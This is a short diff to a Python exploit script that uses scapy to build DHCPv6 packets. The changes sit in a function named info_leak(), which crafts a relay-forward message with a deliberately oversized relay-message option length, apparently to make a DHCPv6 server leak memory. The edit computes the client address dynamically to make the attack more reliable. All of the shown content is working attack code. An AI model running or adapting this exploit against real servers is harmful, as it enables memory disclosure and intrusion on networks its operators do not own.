@@ -5,12 +5,13 @@ from argparse import ArgumentParser
 from sys import exit
 from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
 from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
-from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF
+from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, inet_pton
 from random import randint
 from netaddr import EUI
 from tm import ThreadManager
 from time import sleep
 from binascii import unhexlify
+from ipaddress import IPv6Address
 
 tm = ThreadManager(3)
 
@@ -440,13 +441,12 @@ def info_leak():
     duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
     assert len(duid) == 14
 
+    ipv6_client_addr = inet_pton(AF_INET6, str(IPv6Address(unicode(ipv6src)) + randint(1, 10)))
     pkg = b"".join([
         Base.pack8(12),  # DHCP6RELAYFORW
         '?',
         # Client addr
-        '\xFD\x00',
-        '\x00\x00' * 6,
-        '\x00\x05',
+        ipv6_client_addr,
         '_' * (33 - 17),  # Skip random data.
         # Option 9 - OPTION6_RELAY_MSG
         gen_option(9, inner_pkg(duid), length=N_BYTES),
